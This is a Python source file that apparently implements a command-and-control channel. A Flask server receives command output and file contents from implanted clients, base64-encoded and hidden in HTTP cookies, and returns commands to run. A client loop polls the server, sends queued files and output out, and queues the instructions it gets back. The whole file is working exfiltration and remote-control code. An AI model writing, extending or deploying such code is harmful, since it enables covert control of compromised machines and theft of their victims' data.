import logging
from struct import pack
from flask import Flask, request, Response
from threading import Event, Lock
from typing import Callable, TypedDict
from .client import Client
from sys import getsizeof
from queue import Queue
from time import sleep
import requests
import base64
import io


app = Flask(__name__)

CLIENTS = dict()
CLIENTS_LOCK = Lock()

ENC_FUNC = lambda data : data
DEC_FUNC = lambda data : data


def gen_string_chunks(string: str, chunk_size: int = 256):
    for i in range(0, len(string), chunk_size):
        yield string[i:i + chunk_size]

def gen_file_chunks(stream: io.BufferedReader, chunk_size: int = 256):
    yield read_chunk_of_file(stream, chunk_size)

def read_file(filename: str):
    return open(filename, "rb")

def read_chunk_of_file(stream, chunk_size):
    return stream.read(chunk_size)

def write_file(filename: str):
    return open(filename, "ab")

def write_chunk_to_file(stream, chunk_size):
    return stream.write(chunk_size)

def string_chunks(string: str, chunk_size: int = 256):
    res = []
    for i in range(0, len(string), chunk_size):
        res.append(string[i:i + chunk_size])
    return res    

def gen_chunks(data, chunk_size: int = 1000):
    if isinstance(data, io.BufferedReader):
        chunk = read_chunk_of_file(data, chunk_size)
        while chunk:
            yield str(base64.b64encode(chunk), "utf-8")
            chunk = read_chunk_of_file(data, chunk_size)        
    if isinstance(data, str):
        chunks = string_chunks(data, chunk_size)
        for chunk in chunks:
            yield str(base64.b64encode(str.encode(chunk)), "utf-8")

@app.route("/api")
def communicate_to_client():
    global CLIENTS, CLIENTS_LOCK, DEC_FUNC, ENC_FUNC
    req_cookies = request.cookies

    client_name = req_cookies.get('0')
    packet_id = req_cookies.get('1')
    packet_type =  req_cookies.get('2')
    packet_data =  req_cookies.get('3')

    packet_data = str(base64.b64decode( DEC_FUNC(packet_data)), "utf-8")

    logging.info(f"Client:{client_name} Packetid {packet_id} Packettype {packet_type}")

    with CLIENTS_LOCK:
        if client_name not in CLIENTS.keys():
            logging.info(f"new client {client_name}")
            CLIENTS[client_name] = Client(client_name)
        client = CLIENTS[client_name]
        
        if packet_type == 'stdout':
            logging.info(f"add {packet_data} to stdout queue")
            client.get_stdout_queue().put(packet_data)

        elif 'file ' in packet_type :
            logging.info(f"add {packet_data} to file queue")
            client.get_file_queue().put({'file': packet_type.replace('file ', ''),'data': packet_data})

        elif packet_type.startswith('nodata'): 
            logging.info(f"nodata sent ")

    resp = Response()
    cmd = ""
    if client.get_stdin_queue().qsize() != 0:
        cmd = client.get_stdin_queue().get()
    logging.info(f"SEND COMMAND: [{cmd}]")
    resp.set_cookie('0', cmd)
    return resp

def gen_cookies(client_id: str, packet_id: str, data, data_type: str, chunk_size: int = 100) -> dict:
    # prepare data to be exfiltrated
    cookies = {         # Max cookie size 4093 bytes
        '0': str(client_id),
        '1': str(packet_id),
        '2': str(data_type),  # Type [+ filename]
    }
    
    # 3: Data frame
    for chunk in gen_chunks(data, chunk_size):
        logging.info(f"GEN chunk {cookies['0']} {chunk}")
        cookies['3'] = ENC_FUNC(chunk)
        yield cookies

def communicate_to_cc(url, cookies: dict) -> dict:
    logging.info(f"Sending -->{cookies}")
    r = requests.get(url, cookies=cookies)
    # extract instructions from CC    
    var = r.cookies.get('0')
    logging.info(f"Getting<--{var}")
    return var

def communication_client_main(identifier: str, exfiltrate_queue: Queue,  instructions_queue: Queue, encryption_function: Callable = ENC_FUNC, decryption_function: Callable = DEC_FUNC, time_between_requests: int = 10, url="http://127.0.0.1:8080/api"):
    global ENC_FUNC, DEC_FUNC
    ENC_FUNC = encryption_function
    DEC_FUNC = decryption_function

    while True:
        sleep(time_between_requests)
        if exfiltrate_queue.qsize() == 0:
            logging.info(f"Nothing to exfiltrate")
            for cookies in gen_cookies(identifier, "EMPTY", "no data", "nodata"):
                logging.info(f"Cookie: {cookies}")
                resp = communicate_to_cc(url, cookies)
                if resp != None:
                    logging.info(f"NEW instruction: [{resp}]")
                    instructions_queue.put(resp)
        else:            
            element = exfiltrate_queue.get()
            logging.info(f"check queue to exifil data: {element}")

            if isinstance(element, dict):
                data_type = f"file {element['filename']}"
                data = element['data']
            else:
                data_type = "stdout"
                data = element
            logging.info(f"Data Type: {data_type} Data: {data}")
            for cookies in gen_cookies(identifier, "id", data, data_type):
                logging.info(f"Cookie: {cookies}")
                resp = communicate_to_cc(url, cookies)
                if resp != None:
                    logging.info(f"NEW instruction: [{resp}]")
                    instructions_queue.put(resp)

            # Send extra packet as flag for done transmitting
            for cookies in gen_cookies(identifier, "-1", "_EOF_", data_type):
                logging.info(f"Cookie: {cookies}")
                resp = communicate_to_cc(url, cookies)
                if resp != None:
                    logging.info(f"NEW instruction: [{resp}]")
                    instructions_queue.put(resp)        
        
def communication_server_main(clients: dict, clients_lock: Lock, shutdown_signal: Event, encryption_function: Callable = ENC_FUNC, decryption_function: Callable = DEC_FUNC, ip: str = "127.0.0.1", port: int = 8080):
    global CLIENTS, CLIENTS_LOCK, ENC_FUNC, DEC_FUNC
    CLIENTS = clients
    CLIENTS_LOCK = clients_lock

    ENC_FUNC = encryption_function
    DEC_FUNC = decryption_function

    app.run(ip, port) # , debug=True